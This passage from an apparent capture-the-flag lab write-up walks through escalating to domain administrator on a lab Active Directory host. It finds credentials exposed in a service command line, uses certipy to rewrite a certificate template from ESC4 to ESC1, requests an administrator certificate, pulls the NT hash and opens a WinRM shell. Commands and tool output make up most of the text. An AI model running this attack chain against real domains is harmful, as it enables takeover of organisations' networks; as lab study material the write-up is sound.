| svchost                               | 5036     | 125     | 9      | 1332   | 7504   | 0      | 0  | Service Host                                                                            | Normal.                                                                                                                                                |
| svchost                               | 5724     | 310     | 17     | 15348  | 18500  | 0      | 0  | Service Host                                                                            | Normal.                                                                                                                                                |
| svchost                               | 6096     | 246     | 13     | 3868   | 11364  | 0      | 0  | Service Host                                                                            | Normal.                                                                                                                                                |
| System                                | 4        | 1627    | 0      | 40     | 140    | 0      | 0  | NT Kernel & System                                                                      | Core kernel process.                                                                                                                                   |
| vds                                   | 4308     | 214     | 16     | 2452   | 11196  | 0      | 0  | Virtual Disk Service                                                                    | Manages storage volumes / disks.                                                                                                                       |
| VGAuthService                         | 3324     | 170     | 11     | 2436   | 11144  | 0      | 0  | VMware Guest Authentication Service                                                     | VMware Tools component.                                                                                                                                |
| vm3dservice                           | 3240     | 124     | 9      | 1556   | 6636   | 0      | 0  | VMware 3D Graphics Service (system)                                                     | VMware graphics driver.                                                                                                                                |
| vm3dservice                           | 3616     | 131     | 10     | 1672   | 7112   | 0      | 1  | VMware 3D Graphics Service (session)                                                    | Same as above.                                                                                                                                         |
| vmtoolsd                              | 3220     | 434     | 24     | 11128  | 24696  | 0      | 0  | VMware Tools Daemon                                                                     | Provides guest-host integration (time sync, shutdown, etc.).                                                                                           |
| wininit                               | 528      | 151     | 11     | 1368   | 7272   | 0      | 0  | Windows Start-Up Application                                                            | Core boot process.                                                                                                                                     |
| winlogon                              | 600      | 226     | 13     | 2820   | 15932  | 0      | 1  | Windows Logon Process                                                                   | Handles user logon / GINA.                                                                                                                             |
| WmiPrvSE                              | 4160     | 440     | 21     | 12120  | 24416  | 0      | 0  | WMI Provider Host                                                                       | Hosts WMI queries. Common for monitoring tools.                                                                                                        |
| wsmprovhost                           | 5520     | 877     | 37     | 69180  | 88988  | 2.31   | 0  | WinRM Provider Host                                                                     |                                                                                                                                                        |

### helpdisk

{{< toggle "Tag 🏷️" >}}

{{< tag "Windows-Privilege-Enumation-Service" >}} This account doesn’t have permissions to `Get-Service`, but I can look at the service-related registry keys. The Edge and EC2 ones are there running from their installation directories to find that having credentials in the command:\
{{< /toggle >}}

This account doesn’t have permissions to `Get-Service`, but I can look at the service-related registry keys. The Edge and EC2 ones are there running from their installation directories:

```
Get-ChildItem -Path HKLM:\SYSTEM\CurrentControlSet\services | Get-ItemProperty | Select-Object ImagePath | Select-String ec2
```

```
Get-ChildItem -Path HKLM:\SYSTEM\CurrentControlSet\services | Get-ItemProperty | Select-Object ImagePath | Select-String MicrosoftEdge
```

The helpdesk one is in `C:\Windows`, but more interestingly seems to have credentials in the command:

```
evil-winrm-py PS C:\Users\mgtsvc$> Get-ChildItem -Path HKLM:\SYSTEM\CurrentControlSet\services | Get-ItemProperty |
 Select-Object ImagePath | Select-String helpdesk

@{ImagePath=C:\WINDOWS\helpdesk.exe -u clifford.davey -p RFmoB2WplgE_3p -k netsvcs}
```

It is using the password in the comamnd line to run , and i can use the Get-ChildItem to enum it

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ netexec smb DC.sendai.vl -u clifford.davey -p RFmoB2WplgE_3p
SMB         10.129.234.66   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.66   445    DC               [+] sendai.vl\clifford.davey:RFmoB2WplgE_3p 
                                                                                                                   
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ netexec ldap  DC.sendai.vl -u clifford.davey -p RFmoB2WplgE_3p
LDAP        10.129.234.66   389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:sendai.vl) (signing:None) (channel binding:Never)
LDAP        10.129.234.66   389    DC               [+] sendai.vl\clifford.davey:RFmoB2WplgE_3p 
                                                                                                                   
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ 
```

it is work

Clifford.Davey is a member of the CA-Operators group:

![Pasted image 20260419004012.png](/ob/Pasted%20image%2020260419004012.png)\
Identifying the CA , maybe i can use the

### EC4 change to EC1

{{< toggle "Tag 🏷️" >}}

{{< tag "Port-unknown-ADCS-ESC4-change-ESC1" >}} Identifying the Clifford.Davey is a member of the CA-Operators group , the CA is the hints to find the vuln of ESC4 , but i want to change to ESC1 for more easy exploited

{{< /toggle >}}

It found the EC4 is vulnerable

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ certipy-ad find -target DC.sendai.vl  -u clifford.davey@sendai.vl   -p RFmoB2WplgE_3p  -k -vulnerable -stdout
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[!] KRB5CCNAME environment variable not set
[!] DNS resolution failed: The DNS query name does not exist: DC.sendai.vl.
[!] Use -debug to print a stacktrace
[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Finding issuance policies
[*] Found 16 issuance policies
[*] Found 0 OIDs linked to templates
[!] DNS resolution failed: The DNS query name does not exist: dc.sendai.vl.
[!] Use -debug to print a stacktrace
[*] Retrieving CA configuration for 'sendai-DC-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'sendai-DC-CA'
[*] Checking web enrollment for CA 'sendai-DC-CA' @ 'dc.sendai.vl'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : sendai-DC-CA
    DNS Name                            : dc.sendai.vl
    Certificate Subject                 : CN=sendai-DC-CA, DC=sendai, DC=vl
    Certificate Serial Number           : 326E51327366FC954831ECD5C04423BE
    Certificate Validity Start          : 2023-07-11 09:19:29+00:00
    Certificate Validity End            : 2123-07-11 09:29:29+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : SENDAI.VL\Administrators
      Access Rights
        ManageCa                        : SENDAI.VL\Administrators
                                          SENDAI.VL\Domain Admins
                                          SENDAI.VL\Enterprise Admins
        ManageCertificates              : SENDAI.VL\Administrators
                                          SENDAI.VL\Domain Admins
                                          SENDAI.VL\Enterprise Admins
        Enroll                          : SENDAI.VL\Authenticated Users
Certificate Templates
  0
    Template Name                       : SendaiComputer
    Display Name                        : SendaiComputer
    Certificate Authorities             : sendai-DC-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireDns
    Enrollment Flag                     : AutoEnrollment
    Extended Key Usage                  : Server Authentication
                                          Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 100 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 4096
    Template Created                    : 2023-07-11T12:46:12+00:00
    Template Last Modified              : 2023-07-11T12:46:19+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : SENDAI.VL\Domain Admins
                                          SENDAI.VL\Domain Computers
                                          SENDAI.VL\Enterprise Admins
      Object Control Permissions
        Owner                           : SENDAI.VL\Administrator
        Full Control Principals         : SENDAI.VL\Domain Admins
                                          SENDAI.VL\Enterprise Admins
                                          SENDAI.VL\ca-operators
        Write Owner Principals          : SENDAI.VL\Domain Admins
                                          SENDAI.VL\Enterprise Admins
                                          SENDAI.VL\ca-operators
        Write Dacl Principals           : SENDAI.VL\Domain Admins
                                          SENDAI.VL\Enterprise Admins
                                          SENDAI.VL\ca-operators
        Write Property Enroll           : SENDAI.VL\Domain Admins
                                          SENDAI.VL\Domain Computers
                                          SENDAI.VL\Enterprise Admins
    [+] User Enrollable Principals      : SENDAI.VL\ca-operators
                                          SENDAI.VL\Domain Computers
    [+] User ACL Principals             : SENDAI.VL\ca-operators
    [!] Vulnerabilities
      ESC4                              : User has dangerous permissions.
                                                                               
```

`certipy` has a built in `template` subcommand to abuse ESC4. I’ll start with that:

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ certipy-ad  template -u clifford.davey -p RFmoB2WplgE_3p -dc-ip 10.129.234.66  -template SendaiComputer -write-default-configuration -no-save
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Updating certificate template 'SendaiComputer'
[*] Replacing:
[*]     nTSecurityDescriptor: b'\x01\x00\x04\x9c0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x14\x00\x00\x00\x02\x00\x1c\x00\x01\x00\x00\x00\x00\x00\x14\x00\xff\x01\x0f\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00'
[*]     flags: 66104
[*]     pKIDefaultKeySpec: 2
[*]     pKIKeyUsage: b'\x86\x00'
[*]     pKIMaxIssuingDepth: -1
[*]     pKICriticalExtensions: ['2.5.29.19', '2.5.29.15']
[*]     pKIExpirationPeriod: b'\x00@9\x87.\xe1\xfe\xff'
[*]     pKIExtendedKeyUsage: ['1.3.6.1.5.5.7.3.2']
[*]     pKIDefaultCSPs: ['2,Microsoft Base Cryptographic Provider v1.0', '1,Microsoft Enhanced Cryptographic Provider v1.0']
[*]     msPKI-Enrollment-Flag: 0
[*]     msPKI-Private-Key-Flag: 16
[*]     msPKI-Certificate-Name-Flag: 1
[*]     msPKI-Minimal-Key-Size: 2048
[*]     msPKI-Certificate-Application-Policy: ['1.3.6.1.5.5.7.3.2']
Are you sure you want to apply these changes to 'SendaiComputer'? (y/N): y
[*] Successfully updated 'SendaiComputer'
                                                    
```

If I run the same `find -vulnerable` scan again, this time it shows ESC1 as well:

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ certipy-ad find -target DC.sendai.vl  -u clifford.davey@sendai.vl   -p RFmoB2WplgE_3p  -k -vulnerable -stdout                                
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[!] KRB5CCNAME environment variable not set
[!] DNS resolution failed: The DNS query name does not exist: DC.sendai.vl.
[!] Use -debug to print a stacktrace
[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Finding issuance policies
[*] Found 16 issuance policies
[*] Found 0 OIDs linked to templates
[!] DNS resolution failed: The DNS query name does not exist: dc.sendai.vl.
[!] Use -debug to print a stacktrace
[*] Retrieving CA configuration for 'sendai-DC-CA' via RRP
[*] Successfully retrieved CA configuration for 'sendai-DC-CA'
[*] Checking web enrollment for CA 'sendai-DC-CA' @ 'dc.sendai.vl'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : sendai-DC-CA
    DNS Name                            : dc.sendai.vl
    Certificate Subject                 : CN=sendai-DC-CA, DC=sendai, DC=vl
    Certificate Serial Number           : 326E51327366FC954831ECD5C04423BE
    Certificate Validity Start          : 2023-07-11 09:19:29+00:00
    Certificate Validity End            : 2123-07-11 09:29:29+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : SENDAI.VL\Administrators
      Access Rights
        ManageCa                        : SENDAI.VL\Administrators
                                          SENDAI.VL\Domain Admins
                                          SENDAI.VL\Enterprise Admins
        ManageCertificates              : SENDAI.VL\Administrators
                                          SENDAI.VL\Domain Admins
                                          SENDAI.VL\Enterprise Admins
        Enroll                          : SENDAI.VL\Authenticated Users
Certificate Templates
  0
    Template Name                       : SendaiComputer
    Display Name                        : SendaiComputer
    Certificate Authorities             : sendai-DC-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2023-07-11T12:46:12+00:00
    Template Last Modified              : 2026-04-18T16:46:39+00:00
    Permissions
      Object Control Permissions
        Owner                           : SENDAI.VL\Administrator
        Full Control Principals         : SENDAI.VL\Authenticated Users
        Write Owner Principals          : SENDAI.VL\Authenticated Users
        Write Dacl Principals           : SENDAI.VL\Authenticated Users
    [+] User Enrollable Principals      : SENDAI.VL\Authenticated Users
    [+] User ACL Principals             : SENDAI.VL\Authenticated Users
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.
      ESC4                              : User has dangerous permissions.
                                                                        
```

ESC1 says that the enrollee can provide any subject I want. Now I just request a certificate for the administrator:

You may try a few time

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ certipy-ad  req -u clifford.davey -p RFmoB2WplgE_3p -dc-ip 10.129.234.66   -ca sendai-DC-CA -target DC.sendai.vl -template SendaiComputer -upn administrator@sendai.vl -sid S-1-5-21-3085872742-570972823-736764132-500 -debug
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[+] Nameserver: '10.129.234.66'
[+] DC IP: '10.129.234.66'
[+] DC Host: None
[+] Target IP: None
[+] Remote Name: 'DC.sendai.vl'
[+] Domain: ''
[+] Username: 'CLIFFORD.DAVEY'
[+] Trying to resolve 'DC.sendai.vl' at '10.129.234.66'
[+] Generating RSA key
[*] Requesting certificate via RPC
[+] Trying to connect to endpoint: ncacn_np:10.129.234.66[\pipe\cert]
[+] Connected to endpoint: ncacn_np:10.129.234.66[\pipe\cert]
[*] Request ID is 7
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@sendai.vl'
[+] Found SID in SAN URL: 'S-1-5-21-3085872742-570972823-736764132-500'
[+] Found SID in security extension: 'S-1-5-21-3085872742-570972823-736764132-500'
[*] Certificate object SID is 'S-1-5-21-3085872742-570972823-736764132-500'
[*] Saving certificate and private key to 'administrator.pfx'
[+] Attempting to write data to 'administrator.pfx'
[+] Data written to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
                                                                                                                                                                              
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]

```

Now use the resulting `.pfx` to authenticate:

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.234.66 -domain sendai.vl
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@sendai.vl'
[*]     SAN URL SID: 'S-1-5-21-3085872742-570972823-736764132-500'
[*]     Security Extension SID: 'S-1-5-21-3085872742-570972823-736764132-500'
[*] Using principal: 'administrator@sendai.vl'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@sendai.vl': aad3b435b51404eeaad3b435b51404ee:cfb106feec8b89a3d98e14dcbe8d087a

```

That hash will let me get a shell over WinRM:

```
evil-winrm-py PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                 LastWriteTime         Length Name                                                                  
----                 -------------         ------ ----                                                                  
-a----         4/15/2025   8:27 PM             32 root.txt                                                              


evil-winrm-py PS C:\Users\Administrator\Desktop> type root.txt
1bc134a7b4ae19fcc072082026d991cf
evil-winrm-py PS C:\Users\Administrator\Desktop>

```
